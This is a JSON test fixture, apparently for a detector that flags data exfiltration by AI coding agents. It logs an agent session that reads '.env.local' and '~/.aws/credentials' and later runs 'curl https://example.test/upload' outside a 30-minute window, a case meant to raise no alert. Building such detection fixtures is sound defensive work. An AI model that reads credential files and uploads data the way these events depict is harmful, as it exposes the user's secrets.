@@ -1,0 +1,143 @@
+{
+  "source": "authored",
+  "note": "A sensitive read with no egress, egress before the read, and egress outside the 30-minute window.",
+  "events": [
+    {
+      "id": "evt_exfil_start",
+      "schema_version": 1,
+      "type": "session.start",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:00:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": null,
+      "prev_hash": null,
+      "data": {
+        "title": "fixture"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_early_fetch",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:00:01.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_early_fetch",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "webfetch",
+        "target": "https://example.test/docs",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_env_only",
+      "schema_version": 1,
+      "type": "document.access",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:00:02.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_env_only",
+      "prev_hash": null,
+      "data": {
+        "path": "/home/dev/demo/.env.local",
+        "operation": "read",
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_ls",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:00:03.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_ls",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "ls -la",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_creds",
+      "schema_version": 1,
+      "type": "document.access",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:02:00.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_creds",
+      "prev_hash": null,
+      "data": {
+        "path": "/home/dev/.aws/credentials",
+        "operation": "read",
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    },
+    {
+      "id": "evt_exfil_late_curl",
+      "schema_version": 1,
+      "type": "hook.script",
+      "session_id": "ses_exfil",
+      "agent": {
+        "name": "opencode",
+        "version": "unknown"
+      },
+      "capture_path": "plugin_hook",
+      "timestamp": "2026-11-07T10:32:01.000Z",
+      "seq": null,
+      "duration_ms": null,
+      "correlation_id": "call_late_curl",
+      "prev_hash": null,
+      "data": {
+        "hook": "tool.execute.after",
+        "target_tool": "bash",
+        "target": "curl https://example.test/upload",
+        "exit_code": 0,
+        "outcome": "ok"
+      },
+      "raw_extra": {}
+    }
+  ],
+  "expect": []
+}
